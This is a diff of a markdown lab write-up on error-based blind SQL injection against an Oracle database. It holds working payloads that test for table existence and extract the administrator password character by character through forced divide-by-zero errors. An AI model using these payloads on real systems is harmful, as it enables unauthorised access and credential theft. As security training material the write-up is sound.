@@ -51,12 +51,13 @@ SELECT * FROM doesnt_exist
 
 So with that mind, I will need to concatonate this onto my payload like the following:
 
+Should NOT error
 ```sql
-
-#Should NOT error
 '||(SELECT * FROM dual)--
+```
 
-# SHOULD error
+SHOULD error
+```sql
 '||(SELECT * FROM doesn't_exist)--
 ```
 
@@ -120,11 +121,13 @@ In a similar fasion I can create a query that can guess the password one charact
 
 The initial query string:
 
+This tests if the first character is an 'a'
 ```sql
-#This tests if the first character is an 'a'
 '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')--
+```
 
-#This would check if the second character was 'b'
+This would check if the second character was 'b'
+```sq;
 '||(SELECT CASE WHEN SUBSTR(password,2,1)='b' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')
 ```
 
